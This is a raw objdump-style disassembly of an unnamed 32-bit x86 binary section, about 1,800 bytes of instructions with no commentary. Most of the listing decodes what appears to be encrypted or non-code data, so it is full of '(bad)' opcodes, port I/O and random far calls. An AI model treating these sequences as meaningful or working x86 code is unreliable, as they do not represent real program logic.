  40d418:	mov    eax,ds:0xd60e763d
  40d41d:	mov    ebp,0xed7dfbd2
  40d422:	ins    BYTE PTR es:[edi],dx
  40d423:	cmovp  edi,eax
  40d426:	pop    edx
  40d427:	fdiv   QWORD PTR [ebp+0x64]
  40d42a:	(bad)  
  40d42b:	xor    eax,0x54d81c99
  40d430:	push   ebp
  40d431:	(bad)  
  40d432:	ds pushf 
  40d434:	idiv   edx
  40d436:	pushf  
  40d437:	pop    edx
  40d438:	mov    al,ds:0x509a97c
  40d43d:	push   esp
  40d43e:	retf   0x245c
  40d441:	cmp    ch,BYTE PTR [edi]
  40d443:	shl    BYTE PTR [edx],cl
  40d445:	mov    fs,WORD PTR [ecx+0x36]
  40d448:	mov    ebx,DWORD PTR [edi]
  40d44a:	in     eax,0x21
  40d44c:	out    0xe5,eax
  40d44e:	push   edi
  40d44f:	jmp    DWORD PTR [ebx]
  40d451:	dec    esp
  40d452:	xchg   edx,eax
  40d453:	mov    ch,0xd
  40d455:	mov    ah,0x6c
  40d457:	ror    DWORD PTR [esp+eax*2-0x4368ed98],cl
  40d45e:	jno    0x40d4ac
  40d460:	bnd jae 0x40d4bc
  40d463:	jge    0x40d49d
  40d465:	ror    DWORD PTR [ebp+0x4e],cl
  40d468:	nop
  40d469:	mov    cl,0xd1
  40d46b:	mov    BYTE PTR [esi+eiz*1-0x74c1b36e],dh
  40d472:	pusha  
  40d473:	test   al,0xe6
  40d475:	jo     0x40d476
  40d477:	arpl   WORD PTR [ecx-0x2c],bx
  40d47a:	aaa    
  40d47b:	mov    dl,0xc5
  40d47d:	mov    ds:0x6fa6684c,eax
  40d482:	sub    BYTE PTR [ecx],cl
  40d484:	aas    
  40d485:	lea    ebx,ds:0xb3a09037
  40d48b:	cmp    al,0x17
  40d48d:	push   cs
  40d48e:	inc    eax
  40d48f:	ss pop esi
  40d491:	js     0x40d4a2
  40d493:	test   al,ch
  40d495:	call   0x591e:0x47763206
  40d49c:	cmp    eax,0x1f2189b2
  40d4a1:	pop    ecx
  40d4a2:	and    cl,dl
  40d4a4:	inc    edx
  40d4a5:	cmp    BYTE PTR [edx+0x12],bh
  40d4a8:	into   
  40d4a9:	(bad)  
  40d4aa:	and    esi,ebp
  40d4ac:	cmp    bl,cl
  40d4ae:	add    al,0xff
  40d4b0:	pop    ecx
  40d4b1:	fisub  WORD PTR [edx+0x2894b699]
  40d4b7:	cmp    bh,BYTE PTR es:[ebp-0xe3df81b]
  40d4be:	aas    
  40d4bf:	lahf   
  40d4c0:	rcr    DWORD PTR [esp+edx*8-0x55],1
  40d4c4:	mov    bh,0x19
  40d4c6:	shr    BYTE PTR [esi-0x77],cl
  40d4c9:	repz mov cl,0xfd
  40d4cc:	mov    ecx,0x4aaa9147
  40d4d1:	adc    esp,DWORD PTR [edx]
  40d4d3:	iret   
  40d4d4:	or     dh,al
  40d4d6:	popf   
  40d4d7:	in     eax,0x72
  40d4d9:	xchg   ebx,eax
  40d4da:	aaa    
  40d4db:	push   eax
  40d4dc:	ret    
  40d4dd:	fs jg  0x40d4b0
  40d4e0:	or     eax,DWORD PTR [edi+0x2aad3d79]
  40d4e6:	jbe    0x40d4ae
  40d4e8:	sti    
  40d4e9:	sbb    eax,0x8b37fdab
  40d4ee:	or     BYTE PTR [edx-0x29],0x6
  40d4f2:	in     al,dx
  40d4f3:	aaa    
  40d4f4:	(bad)  
  40d4f5:	sbb    BYTE PTR [ebp+0x32],dl
  40d4f8:	cmc    
  40d4f9:	push   esi
  40d4fa:	cwde   
  40d4fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4fc:	mov    ebx,0x97c59fb5
  40d501:	pop    ebp
  40d502:	xchg   esi,eax
  40d503:	nop
  40d504:	ins    BYTE PTR es:[edi],dx
  40d505:	popf   
  40d506:	test   eax,0xff6fb1ef
  40d50b:	ficomp DWORD PTR [edx+esi*4+0x122a9ed7]
  40d512:	shl    BYTE PTR [esi-0x4333e7f0],1
  40d518:	pop    ecx
  40d519:	cli    
  40d51a:	mov    bh,0x72
  40d51c:	mov    al,ds:0xf6049fbf
  40d521:	mov    WORD PTR [ebp+0x1d],?
  40d524:	inc    eax
  40d525:	in     al,0xe8
  40d527:	and    BYTE PTR [edx+0x3e],dh
  40d52a:	sub    eax,0x444d9990
  40d52f:	ins    DWORD PTR es:[edi],dx
  40d530:	cmp    bl,BYTE PTR [ecx]
  40d532:	icebp  
  40d533:	jge    0x40d4e6
  40d535:	adc    ah,BYTE PTR [eax+0x2a]
  40d538:	xor    al,0xc5
  40d53a:	pop    ecx
  40d53b:	jne    0x40d523
  40d53d:	in     eax,dx
  40d53e:	mov    ch,0x21
  40d540:	and    esi,DWORD PTR [ecx]
  40d542:	xor    al,0x8e
  40d544:	scas   eax,DWORD PTR es:[edi]
  40d545:	xor    BYTE PTR [ebp-0x36259b3a],bl
  40d54b:	dec    ecx
  40d54c:	cs add eax,0x4cb886bc
  40d552:	shl    dh,0xc6
  40d555:	ins    DWORD PTR es:[edi],dx
  40d556:	add    BYTE PTR [ebx],ah
  40d558:	push   cs
  40d559:	in     al,dx
  40d55a:	imul   ebp,DWORD PTR [esi+0x53],0xffffffb1
  40d55e:	fwait
  40d55f:	rcl    BYTE PTR [edi+0xc],1
  40d562:	(bad)
  40d565:	push   edx
  40d566:	add    eax,0x2372596c
  40d56b:	mov    ebx,0x41e8ff85
  40d570:	sbb    bl,dh
  40d572:	push   ecx
  40d573:	fcomp  DWORD PTR [ecx+0x3f]
  40d576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d577:	pop    esi
  40d578:	mov    esp,fs
  40d57a:	loope  0x40d5d6
  40d57c:	test   eax,0x4c8d185f
  40d581:	outs   dx,BYTE PTR ds:[esi]
  40d582:	lds    edi,FWORD PTR [esi-0x37]
  40d585:	push   0xffffffca
  40d587:	daa    
  40d588:	mov    eax,ds:0xf642f5d0
  40d58d:	test   DWORD PTR [eax-0x49b2606],ebx
  40d593:	dec    edi
  40d594:	not    BYTE PTR [eax+0x1d]
  40d597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d598:	mov    al,cl
  40d59a:	lods   eax,DWORD PTR ds:[esi]
  40d59b:	cld    
  40d59c:	imul   ecx,DWORD PTR [ebp-0x4a],0xffffffe6
  40d5a0:	cdq    
  40d5a1:	out    dx,al
  40d5a2:	fs into 
  40d5a4:	loope  0x40d531
  40d5a6:	dec    ebp
  40d5a7:	loopne 0x40d5dc
  40d5a9:	shr    cl,cl
  40d5ab:	mov    edi,0x5a000002
  40d5b0:	fdiv   DWORD PTR [edi+0x64]
  40d5b3:	sbb    esp,DWORD PTR [edx]
  40d5b5:	pop    edx
  40d5b6:	into   
  40d5b7:	sbb    edi,ecx
  40d5b9:	jae    0x40d637
  40d5bb:	out    0x4,al
  40d5bd:	add    BYTE PTR [esi+0x1818dce7],bh
  40d5c3:	rcl    BYTE PTR [eax+ebx*1],cl
  40d5c6:	sbb    BYTE PTR [eax+0x6ff8adb0],cl
  40d5cc:	out    0x55,eax
  40d5ce:	test   BYTE PTR [eax],al
  40d5d0:	dec    esp
  40d5d1:	shl    edx,1
  40d5d3:	xchg   esp,eax
  40d5d4:	push   edi
  40d5d5:	in     al,0x6b
  40d5d7:	cmp    eax,0x73f7f4f0
  40d5dc:	fld    st(0)
  40d5de:	dec    edx
  40d5df:	dec    ebp
  40d5e0:	aad    0x75
  40d5e2:	pop    ecx
  40d5e3:	xor    DWORD PTR [eax+ecx*2],0x32
  40d5e7:	mov    ecx,0x3536f5e3
  40d5ec:	ds call 0xc4991d6c
  40d5f2:	in     eax,dx
  40d5f3:	aas    
  40d5f4:	xchg   BYTE PTR ss:[edi+0x5489a049],ch
  40d5fb:	arpl   WORD PTR [ecx-0x61964b11],cx
  40d601:	in     eax,dx
  40d602:	cmp    DWORD PTR [esi+0x22b3e68c],esp
  40d608:	repz sahf 
  40d60a:	fisttp QWORD PTR [eax-0x32]
  40d60d:	out    dx,eax
  40d60e:	inc    ebx
  40d60f:	ror    ah,cl
  40d611:	sub    bl,0xf5
  40d614:	js     0x40d626
  40d616:	(bad)  
  40d617:	je     0x40d629
  40d619:	dec    edi
  40d61a:	jb     0x40d664
  40d61c:	icebp  
  40d61d:	push   esi
  40d61e:	xchg   ecx,eax
  40d61f:	fsubr  QWORD PTR [ebx]
  40d621:	daa    
  40d622:	inc    DWORD PTR [ebx]
  40d624:	xor    BYTE PTR [edi-0x76],bh
  40d627:	(bad)  
  40d628:	in     al,0xd8
  40d62a:	push   ds
  40d62b:	cmp    DWORD PTR [eax+0x6a6ab2d4],0xfa64acc3
  40d635:	stos   BYTE PTR es:[edi],al
  40d636:	xchg   esi,eax
  40d637:	adc    ah,BYTE PTR ds:0x800d389
  40d63d:	addr16 iret 
  40d63f:	stc    
  40d640:	imul   eax,DWORD PTR [esp+eax*1+0x45],0xe94c88e7
  40d648:	pop    esi
  40d649:	shl    BYTE PTR ds:0x4021efa9,1
  40d64f:	inc    ecx
  40d650:	(bad)  ds:0xd10de18c
  40d656:	and    edx,DWORD PTR [ebp-0x6bb3d36]
  40d65c:	sub    eax,DWORD PTR [ebp-0x2a836f33]
  40d662:	in     al,dx
  40d663:	mov    bh,0xc9
  40d665:	jno    0x40d69d
  40d667:	outs   dx,DWORD PTR ds:[esi]
  40d668:	gs mov dl,0x9e
  40d66b:	popf   
  40d66c:	in     al,dx
  40d66d:	in     al,0x37
  40d66f:	add    al,0x54
  40d671:	adc    al,0x2a
  40d673:	clc    
  40d674:	and    ebp,ebx
  40d676:	jle    0x40d611
  40d678:	sub    dh,BYTE PTR [esi]
  40d67a:	push   ds
  40d67b:	push   edi
  40d67c:	repz and BYTE PTR [ecx-0x34],0x51
  40d681:	inc    ebp
  40d682:	jnp    0x40d63f
  40d684:	stc    
  40d685:	dec    eax
  40d686:	push   cs
  40d687:	mov    ecx,DWORD PTR [edi+0x60]
  40d68a:	mov    al,ds:0x34554ef1
  40d68f:	aaa    
  40d690:	sbb    ch,ch
  40d692:	mov    ch,0x51
  40d694:	outs   dx,BYTE PTR ds:[esi]
  40d695:	rcr    BYTE PTR [esi-0x4c],1
  40d698:	xchg   esp,eax
  40d699:	lock (bad) 
  40d69b:	lea    eax,[esi]
  40d69d:	cmp    esp,edi
  40d69f:	and    bh,BYTE PTR [edx+0x5dcfa21c]
  40d6a5:	aas    
  40d6a6:	pop    es
  40d6a7:	int3   
  40d6a8:	cmp    ch,BYTE PTR [ebx-0x5f0e2eff]
  40d6ae:	aas    
  40d6af:	mov    esi,0x1bb9d3c
  40d6b4:	(bad)  
  40d6b5:	popa   
  40d6b6:	dec    edi
  40d6b7:	arpl   WORD PTR [ecx+0x76],ax
  40d6ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6bb:	mov    ds:0xa1994915,eax
  40d6c0:	lahf   
  40d6c1:	ret    0x6600
  40d6c4:	sbb    ebp,DWORD PTR [ecx+0x69a5dcc6]
  40d6ca:	fdivr  DWORD PTR [ebx]
  40d6cc:	adc    dl,BYTE PTR [edx-0x1d]
  40d6cf:	or     al,0xaf
  40d6d1:	jbe    0x40d67a
  40d6d3:	cld    
  40d6d4:	out    0x4d,eax
  40d6d6:	clc    
  40d6d7:	or     eax,0x15a85906
  40d6dc:	inc    esp
  40d6dd:	and    eax,0xd55e79fc
  40d6e2:	ret    
  40d6e3:	out    dx,eax
  40d6e4:	fcomp  QWORD PTR [esi]
  40d6e6:	sbb    BYTE PTR [edi],ch
  40d6e8:	repz ja 0x40d763
  40d6eb:	pop    edi
  40d6ec:	or     ah,dh
  40d6ee:	inc    esp
  40d6ef:	fisttp WORD PTR [edx+eax*8-0x41]
  40d6f3:	add    ebx,esp
  40d6f5:	inc    ebp
  40d6f6:	int    0x52
  40d6f8:	jge    0x40d6e3
  40d6fa:	stc    
  40d6fb:	cdq    
  40d6fc:	sub    edi,DWORD PTR [edi+0x79]
  40d6ff:	fmulp  st(1),st
  40d701:	adc    DWORD PTR [edx-0x3c],esi
  40d704:	inc    ebx
  40d705:	outs   dx,DWORD PTR ds:[esi]
  40d706:	inc    ecx
  40d707:	scas   al,BYTE PTR es:[edi]
  40d708:	mov    DWORD PTR [edx-0x1b],ebp
  40d70b:	inc    edi
  40d70c:	mov    dh,BYTE PTR [ebp+0xd]
  40d70f:	int    0x71
  40d711:	jmp    FWORD PTR [edx-0x5a]
  40d714:	popf   
  40d715:	cmp    DWORD PTR [esp+esi*8+0x38],esp
  40d719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d71a:	call   0xeed0:0xc2758a8a
  40d721:	shr    ah,1
  40d723:	arpl   si,sp
  40d725:	cdq    
  40d726:	xlat   BYTE PTR ds:[ebx]
  40d727:	in     eax,0x5c
  40d729:	xchg   ebx,eax
  40d72a:	push   ss
  40d72b:	stos   DWORD PTR es:[edi],eax
  40d72c:	push   edi
  40d72d:	call   0x17d4:0xfeccb4c9
  40d734:	push   edi
  40d735:	jo     0x40d73c
  40d737:	and    BYTE PTR [ebx-0xe],dh
  40d73a:	out    0x40,al
  40d73c:	jmp    0x40d6f4
  40d73e:	xchg   edi,eax
  40d73f:	mov    ds:0xcd53f332,eax
  40d744:	js     0x40d70c
  40d746:	mov    edi,0xebc523ee
  40d74b:	js     0x40d7a3
  40d74d:	loope  0x40d799
  40d74f:	push   ebx
  40d750:	sbb    DWORD PTR [esi+0x5d],ecx
  40d753:	out    dx,al
  40d754:	repnz mov edi,0xaa94073d
  40d75a:	mov    eax,ds:0x5d2dcf7
  40d75f:	add    al,0x53
  40d761:	inc    edi
  40d762:	repnz add eax,DWORD PTR [ebp-0x7f]
  40d766:	sbb    BYTE PTR [ebx+0x171c78ab],0xa7
  40d76d:	arpl   bp,si
  40d76f:	mov    bh,0xe3
  40d771:	pop    es
  40d772:	out    dx,eax
  40d773:	pop    es
  40d774:	xchg   edx,eax
  40d775:	retfw  
  40d777:	ror    DWORD PTR [esi-0x31],0x6c
  40d77b:	jg     0x40d7df
  40d77d:	add    al,0x56
  40d77f:	out    dx,al
  40d780:	cmp    BYTE PTR [edx],bl
  40d782:	pop    ecx
  40d783:	shr    DWORD PTR [esi],cl
  40d785:	pop    esi
  40d786:	hlt    
  40d787:	sub    DWORD PTR [edx],ecx
  40d789:	mov    dl,0xd2
  40d78b:	jae    0x40d78b
  40d78d:	pop    esi
  40d78e:	out    dx,eax
  40d78f:	fdivr  QWORD PTR [esi]
  40d791:	fdivr  st(6),st
  40d793:	mov    ds:0x72f3b61e,al
  40d798:	scas   al,BYTE PTR es:[edi]
  40d799:	loope  0x40d7e8
  40d79b:	sbb    esp,DWORD PTR [ebx-0x5]
  40d79e:	jbe    0x40d7b8
  40d7a0:	stos   BYTE PTR es:[edi],al
  40d7a1:	nop
  40d7a2:	sbb    al,0x58
  40d7a4:	sbb    DWORD PTR [esp+edx*4+0x5497cc03],edx
  40d7ab:	stc    
  40d7ac:	mov    bl,0xbf
  40d7ae:	xor    BYTE PTR ds:0x1fbba4b6,bl
  40d7b4:	or     edi,DWORD PTR [edx+eax*2-0x11a9c920]
  40d7bb:	fwait
  40d7bc:	(bad)  
  40d7bd:	cld    
  40d7be:	adc    DWORD PTR [edx+eax*2+0xc],0xdd2f6742
  40d7c6:	or     eax,0x6b575bef
  40d7cb:	popf   
  40d7cc:	inc    esi
  40d7cd:	push   edx
  40d7ce:	(bad)  
  40d7cf:	push   edi
  40d7d0:	out    dx,al
  40d7d1:	pop    edx
  40d7d2:	fsub   QWORD PTR [edi-0x1df24bf2]
  40d7d8:	es inc esi
  40d7da:	lea    esp,[edx+esi*8-0x52548d0a]
  40d7e1:	repnz and al,BYTE PTR [ebx]
  40d7e4:	data16 mov dh,0x42
  40d7e7:	int    0x76
  40d7e9:	jmp    0x4ecb2c55
  40d7ee:	loope  0x40d7bf
  40d7f0:	aas    
  40d7f1:	push   es
  40d7f2:	loopne 0x40d841
  40d7f4:	mov    ds:0xa6772c4c,eax
  40d7f9:	jecxz  0x40d7f4
  40d7fb:	mov    ds:0x5b1aeb34,eax
  40d800:	aam    0x8c
  40d802:	mov    BYTE PTR [esi+eax*1-0x65],dh
  40d806:	pop    eax
  40d807:	push   cs
  40d808:	out    0x85,eax
  40d80a:	xchg   esp,eax
  40d80b:	or     eax,0x6d3c7934
  40d810:	push   ebp
  40d811:	ins    BYTE PTR es:[edi],dx
  40d812:	pop    es
  40d813:	shr    DWORD PTR [esi-0x3219feac],1
  40d819:	add    DWORD PTR [ebx],ebx
  40d81b:	test   BYTE PTR [edx+0x4cbe7046],al
  40d821:	dec    edx
  40d822:	inc    edi
  40d823:	out    dx,al
  40d824:	aad    0xd1
  40d826:	call   DWORD PTR [ecx]
  40d828:	rcl    DWORD PTR [edx],cl
  40d82a:	dec    esp
  40d82b:	sub    eax,DWORD PTR [eax]
  40d82d:	adc    ebx,DWORD PTR [esp+edx*1+0x6b]
  40d831:	push   0x48
  40d833:	pop    ss
  40d834:	jb     0x40d822
  40d836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d837:	and    eax,0x8ab19f6
  40d83c:	stc    
  40d83d:	pop    es
  40d83e:	cmc    
  40d83f:	xor    al,0x1a
  40d841:	leave  
  40d842:	ja     0x40d8b3
  40d844:	inc    esi
  40d845:	add    DWORD PTR [ebx-0x1],ebx
  40d848:	rol    BYTE PTR [eax],0x7c
  40d84b:	mov    cl,0x83
  40d84d:	sbb    DWORD PTR [edx-0x7a4e842a],esp
  40d853:	popf   
  40d854:	loopne 0x40d855
  40d856:	xchg   esi,eax
  40d857:	push   ss
  40d858:	hlt    
  40d859:	lds    esi,FWORD PTR [ebp-0x60]
  40d85c:	imul   ecx,DWORD PTR ds:0xe019779e,0x207fb0ab
  40d866:	jp     0x40d8e5
  40d868:	dec    ebp
  40d869:	fimul  DWORD PTR [ecx+0x3c]
  40d86c:	mul    DWORD PTR [ebp-0x41]
  40d86f:	mov    ch,0x4d
  40d871:	add    BYTE PTR [eax],al
  40d873:	div    ecx
  40d875:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d878:	xor    edx,edx
  40d87a:	div    ecx
  40d87c:	xor    edx,edx
  40d87e:	mov    ecx,eax
  40d880:	jmp    0x40db44
  40d885:	aam    0x63
  40d887:	sbb    eax,0xcc1a1a64
  40d88c:	and    edx,DWORD PTR [ebp+0x79]
  40d88f:	test   eax,0xa19e0cbc
  40d894:	jo     0x40d836
  40d896:	fcomp  DWORD PTR [eax]
  40d898:	sbb    dl,dl
  40d89a:	adc    al,0x18
  40d89c:	sbb    BYTE PTR [esi-0x30cfcfbb],ch
  40d8a2:	push   0x7e625a0
  40d8a7:	mov    edi,0x54d7c322
  40d8ac:	sub    edi,esp
  40d8ae:	imul   ebx,DWORD PTR [eax-0x31],0xffffff8d
  40d8b2:	or     cl,BYTE PTR [ebp+0x5836e8aa]
  40d8b8:	mov    ecx,0x46a2fc11
  40d8bd:	repz jns 0x40d8c1
  40d8c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8c1:	or     esp,DWORD PTR [esi+0x77]
  40d8c4:	ss sub ch,dl
  40d8c7:	add    DWORD PTR [ebx],eax
  40d8c9:	inc    edx
  40d8ca:	es daa 
  40d8cc:	push   edi
  40d8cd:	and    eax,0xeb4fcafa
  40d8d2:	mov    ebx,0x70a87c5d
  40d8d7:	mov    bh,0x3d
  40d8d9:	outs   dx,BYTE PTR ds:[esi]
  40d8da:	add    esi,DWORD PTR [edx]
  40d8dc:	mov    esp,0x57dd92ad
  40d8e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8e2:	ins    BYTE PTR es:[edi],dx
  40d8e3:	rol    BYTE PTR [ecx],cl
  40d8e5:	and    eax,0x8bfa6c
  40d8ea:	cdq    
  40d8eb:	push   es
  40d8ec:	inc    ecx
  40d8ed:	xor    al,0xc7
  40d8ef:	xor    al,0xaa
  40d8f1:	stos   BYTE PTR es:[edi],al
  40d8f2:	repz pop edi
  40d8f4:	popa   
  40d8f5:	scas   eax,DWORD PTR es:[edi]
  40d8f6:	push   0x7ae88210
  40d8fb:	push   edi
  40d8fc:	lods   al,BYTE PTR ds:[esi]
  40d8fd:	arpl   WORD PTR [edx+0x5b],cx
  40d900:	sbb    al,0xf5
  40d902:	push   ds
  40d903:	fstp   TBYTE PTR [ecx-0x61]
  40d906:	mov    ds:0x2c5055e8,al
  40d90b:	enter  0x143a,0xd
  40d90f:	(bad)  
  40d910:	dec    ebp
  40d911:	in     al,dx
  40d912:	rcl    ebp,1
  40d914:	dec    ebp
  40d915:	lods   eax,DWORD PTR ds:[esi]
  40d916:	imul   DWORD PTR [edi+0x6904adfa]
  40d91c:	pop    edx
  40d91d:	outs   dx,BYTE PTR ds:[esi]
  40d91e:	cmp    ch,BYTE PTR [eax-0x71]
  40d921:	outs   dx,DWORD PTR ds:[esi]
  40d922:	and    ch,ah
  40d924:	mov    WORD PTR [edx],es
  40d926:	push   0xfffffff8
  40d928:	stc    
  40d929:	mov    bl,0x3e
  40d92b:	aas    
  40d92c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d92d:	inc    esp
  40d92e:	push   es
  40d92f:	sbb    al,0x61
  40d931:	lods   eax,DWORD PTR ds:[esi]
  40d932:	or     DWORD PTR [ecx],0x8e43096e
  40d938:	(bad)  
  40d939:	mov    ebp,0x5dc422ff
  40d93e:	das    
  40d93f:	sbb    DWORD PTR [edx-0x7d],esp
  40d942:	shl    BYTE PTR [edx+edx*4],0x66
  40d946:	dec    esp
  40d947:	lds    eax,FWORD PTR [ebx]
  40d949:	mov    DWORD PTR [ebx-0x2],esi
  40d94c:	push   edi
  40d94d:	imul   ebx,DWORD PTR [esi+0x58],0x9f8fef65
  40d954:	jnp    0x40d972
  40d956:	loope  0x40d91d
  40d958:	fisub  WORD PTR [eax+0x6cc7f41f]
  40d95e:	das    
  40d95f:	in     eax,dx
  40d960:	and    DWORD PTR [edx+eiz*2+0x39],edx
  40d964:	inc    edx
  40d965:	test   BYTE PTR [ebx+0x7a],0x12
  40d969:	lds    esp,FWORD PTR [esi]
  40d96b:	mov    ch,0x98
  40d96d:	push   eax
  40d96e:	add    eax,0x38dc512d
  40d973:	rcr    DWORD PTR [ebx-0x6a],1
  40d976:	add    esp,DWORD PTR [ebp-0x6e]
  40d979:	mov    dl,0xcc
  40d97b:	movq   mm6,QWORD PTR [edi]
  40d97e:	out    dx,al
  40d97f:	jb     0x40d90c
  40d981:	ret    
  40d982:	loope  0x40d99c
  40d984:	xlat   BYTE PTR ds:[ebx]
  40d985:	test   esp,0xa43061ec
  40d98b:	mov    esi,0xaeaaec61
  40d990:	jo     0x40d9ba
  40d992:	jbe    0x40d986
  40d994:	rol    BYTE PTR [edi+0x21206e98],cl
  40d99a:	das    
  40d99b:	mov    edx,0xa1b73ecf
  40d9a0:	aad    0xac
  40d9a2:	jecxz  0x40d9bc
  40d9a4:	out    dx,eax
  40d9a5:	loop   0x40d984
  40d9a7:	loope  0x40d9d2
  40d9a9:	std    
  40d9aa:	out    0x2c,eax
  40d9ac:	sub    BYTE PTR gs:[ecx+0x7afc2713],ah
  40d9b3:	sub    eax,0x71d32b30
  40d9b8:	pop    es
  40d9b9:	pop    esi
  40d9ba:	popf   
  40d9bb:	stos   BYTE PTR es:[edi],al
  40d9bc:	imul   edx,DWORD PTR [bx+di],0x22fda7be
  40d9c3:	fucomip st,st(2)
  40d9c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9c6:	mov    esi,0x958b4cb9
  40d9cb:	idiv   ebx
  40d9cd:	outs   dx,DWORD PTR ds:[esi]
  40d9ce:	mov    esi,0x6a6b6cff
  40d9d3:	xchg   bx,ax
  40d9d5:	mov    cl,0x53
  40d9d7:	hlt    
  40d9d8:	sub    ecx,esp
  40d9da:	mov    ds:0xd871b776,eax
  40d9df:	test   BYTE PTR [esi-0x639294a7],0x2c
  40d9e6:	es ins BYTE PTR es:[edi],dx
  40d9e8:	jae    0x40da49
  40d9ea:	mov    eax,ds:0x7d77ba17
  40d9ef:	push   eax
  40d9f0:	out    dx,al
  40d9f1:	push   eax
  40d9f2:	(bad)
  40d9f6:	sbb    DWORD PTR [edi-0x11],ebp
  40d9f9:	mov    al,ds:0x5f6fbb53
  40d9fe:	loopne 0x40da1a
  40da00:	ficomp DWORD PTR [edx+0x52]
  40da03:	mov    cx,WORD PTR [eax]
  40da06:	imul   ebx,DWORD PTR [edi-0x34],0x3fe61b35
  40da0d:	cwde   
  40da0e:	mov    dl,0xbb
  40da10:	pushf  
  40da11:	das    
  40da12:	push   edi
  40da13:	in     eax,0x43
  40da15:	xchg   ebx,eax
  40da16:	in     eax,dx
  40da17:	ret    0xab59
  40da1a:	mov    dh,0xd
  40da1c:	lods   eax,DWORD PTR ds:[esi]
  40da1d:	mov    ch,0x20
  40da1f:	sub    DWORD PTR [ecx+0x2438f18d],eax
  40da25:	add    bl,dl
  40da27:	inc    edi
  40da28:	pop    es
  40da29:	imul   esp,DWORD PTR [edi],0x68
  40da2c:	mov    bh,0x1c
  40da2e:	mov    bl,0xde
  40da30:	pop    ds
  40da31:	hlt    
  40da32:	ss jecxz 0x40da6a
  40da35:	inc    edx
  40da36:	js     0x40da4b
  40da38:	pop    esp
  40da39:	mov    BYTE PTR [edi-0x77a49885],ah
  40da3f:	jne    0x40daa3
  40da41:	jl     0x40dabb
  40da43:	jmp    0x40d9ce
  40da45:	aam    0x89
  40da47:	mov    ah,bl
  40da49:	push   ss
  40da4a:	dec    ecx
  40da4b:	pop    edi
  40da4c:	add    BYTE PTR [ecx+esi*2+0x22],bh
  40da50:	xchg   esi,eax
  40da51:	iret   
  40da52:	sbb    BYTE PTR [esi-0x10],dh
  40da55:	enter  0x56d8,0x57
  40da59:	xor    ebp,DWORD PTR [ebp-0x7c151134]
  40da5f:	add    esi,esi
  40da61:	stos   BYTE PTR es:[edi],al
  40da62:	imul   edi,eax,0x5
  40da65:	mov    eax,ds:0x9d0b9e21
  40da6a:	fdiv   DWORD PTR [ecx]
  40da6c:	out    dx,eax
  40da6d:	xchg   ebp,eax
  40da6e:	vmwrite esi,DWORD PTR [ebx-0x73f4cc49]
  40da75:	in     eax,0xc8
  40da77:	jb     0x40da23
  40da79:	sbb    DWORD PTR [ebx-0x6959ac88],ebx
  40da7f:	jae    0x40dab8
  40da81:	mov    cs,WORD PTR [ebx]
  40da83:	cmp    al,0x96
  40da85:	mov    edx,0x84fc03c8
  40da8a:	mov    al,ds:0xb81c3cd6
  40da8f:	mov    dl,0x6e
  40da91:	iret   
  40da92:	sub    al,0x9d
  40da94:	shr    ah,cl
  40da96:	scas   eax,DWORD PTR es:[edi]
  40da97:	pop    ecx
  40da98:	dec    esp
  40da99:	(bad)  
  40da9a:	(bad)  
  40da9b:	xlat   BYTE PTR ds:[ebx]
  40da9c:	fs dec esp
  40da9e:	jno    0x40db09
  40daa0:	push   ss
  40daa1:	bound  eax,QWORD PTR [ecx-0x3a]
  40daa4:	fmulp  st(4),st
  40daa6:	pop    ebp
  40daa7:	adc    DWORD PTR [eax-0x6edfdf3c],edi
  40daad:	in     al,0x49
  40daaf:	sub    BYTE PTR [ecx],ah
  40dab1:	inc    ecx
  40dab2:	xor    DWORD PTR [edx+0x27],0x56
  40dab6:	jmp    0x40da62
  40dab8:	mov    es,esi
  40daba:	jmp    0x40db0d
  40dabc:	add    BYTE PTR [ebx-0x27f852da],dh
  40dac2:	sbb    ch,BYTE PTR [eax+0x50c75704]
  40dac8:	mov    ?,WORD PTR [edi]
  40daca:	ret    0x93a5
  40dacd:	push   ebp
  40dace:	add    eax,0x1c47e8e8
  40dad3:	ss mov bh,0xf
  40dad6:	outs   dx,DWORD PTR ds:[esi]
  40dad7:	push   ds
  40dad8:	xchg   ecx,eax
  40dad9:	mov    al,0xd9
  40dadb:	test   al,0x9a
  40dadd:	icebp  
  40dade:	pop    esp
  40dadf:	dec    esi
  40dae0:	adc    DWORD PTR [edx+0x2b5ac658],edx
  40dae6:	ins    DWORD PTR es:[edi],dx
  40dae7:	out    dx,al
  40dae8:	out    0x22,eax
  40daea:	nop
  40daeb:	and    eax,0x5552481e
  40daf0:	jle    0x40dac9
  40daf2:	jl     0x40db00
  40daf4:	shl    DWORD PTR [edi+0x3b],cl
  40daf7:	jge    0x40db09
  40daf9:	adc    DWORD PTR [ebx+0x6be76ea2],esp
  40daff:	xchg   esp,eax
  40db00:	push   edx
  40db01:	not    BYTE PTR [esp+eiz*4-0x7ef006da]
  40db08:	push   cs
  40db09:	popf   
  40db0a:	retf   
  40db0b:	loop   0x40db7a
  40db0d:	sbb    al,0xcf
  40db0f:	cmp    cl,BYTE PTR [edi]
  40db11:	pop    ebp
  40db12:	arpl   WORD PTR [ecx],dx
  40db14:	out    0xdc,al
  40db16:	das    
  40db17:	add    al,0xf
  40db19:	clc    
  40db1a:	cmp    DWORD PTR [ecx+0x2705cd91],edx
  40db20:	xor    DWORD PTR [edx+ebx*2+0x3b3cddae],esp
  40db27:	ds mov bl,0x75
  40db2a:	add    eax,0x59a8ac6f
  40db2f:	xchg   ebp,eax
  40db31:	pop    ebp
  40db32:	ins    BYTE PTR es:[edi],dx
  40db33:	outs   dx,DWORD PTR ds:[esi]
  40db34:	outs   dx,DWORD PTR ds:[esi]
  40db35:	xchg   esp,eax
  40db36:	jne    0xc28be6ae
  40db3c:	call   0xc4fe021b
  40db41:	retf   
  40db42:	pop    edx
  40db43:	adc    ecx,DWORD PTR [ebx-0x3696f7bb]
  40db49:	add    DWORD PTR [esi],ebp
  40db4b:	add    BYTE PTR [eax],al
